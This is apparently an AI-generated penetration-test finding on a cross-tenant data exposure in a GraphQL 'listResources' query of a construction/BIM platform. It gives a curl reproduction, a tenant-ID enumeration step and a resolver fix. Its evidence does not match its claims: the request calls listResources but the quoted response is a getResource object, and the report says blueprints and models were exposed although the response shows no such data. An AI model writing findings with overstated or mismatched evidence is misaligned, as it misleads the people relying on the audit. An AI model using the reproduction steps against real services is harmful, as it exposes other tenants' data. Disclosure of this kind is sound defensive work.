# Security Analysis Report
**System:** BuildCore BIM Collaboration (Construction / BIM Platform)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0228 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.9 | `listResources` accepts arbitrary `tenantId` parameter — cross-tenant BIM data enumerated |

---

## Finding 1 — Cross-Tenant Bulk Enumeration via `listResources(tenantId:)` (CRITICAL)

### Summary
The `listResources` query on BuildCore BIM Collaboration (`api.buildcore-bim-collab.example.com`) accepts a `tenantId` filter parameter that is taken directly from the client request. The server does not validate that the requested `tenantId` matches the authenticated user's JWT `tenantId`. Per §4.0 RISK-GQL-228 and §5.0 Pattern 1.9, an attacker authenticated as `tenant-2a4c` successfully passed `tenantId: "tenant-f465"` in the query, retrieving a list of all BIM resources belonging to that victim tenant.

**Pattern:** 1.9 — Batch/bulk lookup endpoints (BOLA)
**Affected resolver:** `listResources(tenantId: ID, status: String): [Resource!]`
**Affected endpoint:** `POST https://api.buildcore-bim-collab.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-2a4c`):**
```
POST https://api.buildcore-bim-collab.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-2a4c
Content-Type: application/json

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-f465\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-f465",
      "ownerId": "other-user-2a4cf465",
      "data": {
        "sensitiveField": "CONFIDENTIAL-2a4cf465",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-2a4cf465`
**Timestamp:** `2026-04-13T16:22:37.249074+00:00`

The query returns BIM project resources — blueprints, structural models, project schedules — belonging to `tenant-f465`. The `tenantId` in the response confirms successful cross-tenant data access.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-228 | Resolver gap | `tenantId` not cross-checked against JWT | Architectural root cause |
| §5.0 Pattern 1.9 | Vulnerability | Bulk list endpoint passes arbitrary tenantId | Classification |
| HAR request | `tenantId` param | `tenant-f465` | Attacker-supplied victim tenant ID |
| HAR request | `x-tenant-id` | `tenant-2a4c` | Authenticated attacker tenant |
| HAR response | `tenantId` | `tenant-f465` | Victim tenant — boundary crossed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-2a4cf465` | Confidential BIM/construction data |
| HAR response | `ownerId` | `other-user-2a4cf465` | Victim user confirmed |
| HAR headers | `x-request-id` | `req-2a4cf465` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-2a4c):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Enumerate victim tenant resources (VULNERABLE):**
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-2a4c" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { listResources(tenantId: \"tenant-f465\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.listResources'
# Expected VULNERABLE output: all resources owned by tenant-f465 including CONFIDENTIAL-2a4cf465
```

**Step 3 — Enumerate all tenants:**
```bash
# Attacker iterates known or guessed tenant IDs (e.g., tenant-0001 through tenant-9999)
# Each response leaks full resource list for the targeted tenant
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Server ignores client-supplied tenantId; uses JWT tenantId exclusively
# Cross-tenant query returns empty list or 403 Forbidden
```

### Remediation

1. **Ignore client-supplied `tenantId` in `listResources`:** The server must always derive `tenantId` from the JWT claim, not from query parameters:
   ```javascript
   // Resolver fix
   resolver.listResources = (_, args, context) => {
     const tenantId = context.auth.tenantId; // from JWT, never from args
     return db.resources.findAll({ where: { tenantId } });
   };
   ```
2. **Remove `tenantId` from `listResources` arguments** in the GraphQL schema, or treat it as a hint validated against JWT.
3. **Apply same fix to `bulkResourceLookup`:** Per-ID ownership filtering required (§4.0).
4. **Fix Redis cache:** Cache key must include `tenantId` dimension to prevent cross-tenant cache poisoning (§2.0).
5. **PostgreSQL RLS:** Enforce `tenant_id` row-level policies at database level as defence-in-depth.
